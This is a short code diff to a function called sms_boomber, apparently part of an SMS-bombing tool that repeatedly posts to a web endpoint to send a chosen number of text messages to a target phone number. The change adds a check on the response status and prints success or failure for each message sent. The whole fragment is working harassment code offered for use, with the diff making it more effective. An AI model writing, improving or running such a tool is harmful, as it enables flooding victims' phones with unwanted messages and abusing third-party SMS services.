@@ -25,9 +25,13 @@ def sms_boomber(phonenumber, sms_number):
                 }
 
                 for i in range(int(sms_number)):
-                    post(URL, data)
-                    os.system("clear" or "cls")
-                    print(setting.STRUCT + c.WHITE + " Send " + c.RED + str(i) + c.WHITE + " sms successfuly!")
+                    response = post(URL, data)
+                    if response.status_code == 200:
+                        os.system("clear" or "cls")
+                        print(setting.STRUCT + c.WHITE + " Send " + c.RED + str(i) + c.WHITE + " sms successfuly!")
+                    else:
+                        print(setting.STRUCT + c.WHITE + " Send" + c.RED + str(i) + c.RED + " sms Failed!")
+
                     
                     time.sleep(3)
 
